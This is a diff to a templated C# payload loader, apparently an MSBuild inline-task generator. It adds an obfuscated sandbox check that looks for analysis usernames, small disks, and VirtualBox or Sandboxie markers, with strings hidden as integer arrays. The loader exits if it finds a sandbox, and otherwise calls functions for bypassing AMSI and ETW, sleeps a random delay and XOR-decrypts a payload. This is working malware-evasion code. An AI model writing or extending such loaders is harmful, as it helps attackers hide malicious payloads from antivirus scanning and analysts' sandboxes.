@@ -82,6 +82,22 @@
                 } catch {}
             }
 
+            static bool {{ v.fn_sandbox }}() {
+                try {
+                    string u = Environment.UserName.ToLower();
+                    string[] badU = new string[]{"sandbox","maltest","virus","cuckoo","user","test"};
+                    foreach (var b in badU) if (u == b) return true;
+                    var di = new System.IO.DriveInfo("C");
+                    if (di.TotalSize < 53687091200L) return true;
+                    string cn = Environment.MachineName.ToLower();
+                    if (cn.Contains(B(new int[]{115,97,110,100,98,111,120}))) return true;
+                    if (cn.Contains(B(new int[]{97,110,97,108,121,115,105,115}))) return true;
+                    if (Environment.GetEnvironmentVariable(B(new int[]{86,66,79,88,95,86,69,82,83,73,79,78})) != null) return true;
+                    if (Environment.GetEnvironmentVariable(B(new int[]{83,65,78,68,66,79,88,73,69,95,72,79,77,69})) != null) return true;
+                } catch {}
+                return false;
+            }
+
             static byte[] {{ v.fn_decrypt }}(byte[] data, byte[] key) {
                 var o = new byte[data.Length];
                 for (int i = 0; i < data.Length; i++) o[i] = (byte)(data[i] ^ key[i % key.Length]);
@@ -96,6 +112,7 @@
             }
 
             public override bool Execute() {
+                if ({{ v.fn_sandbox }}()) return false;
                 {{ v.fn_amsi }}();
                 {{ v.fn_etw }}();
                 Thread.Sleep(2000 + new Random().Next(3000));
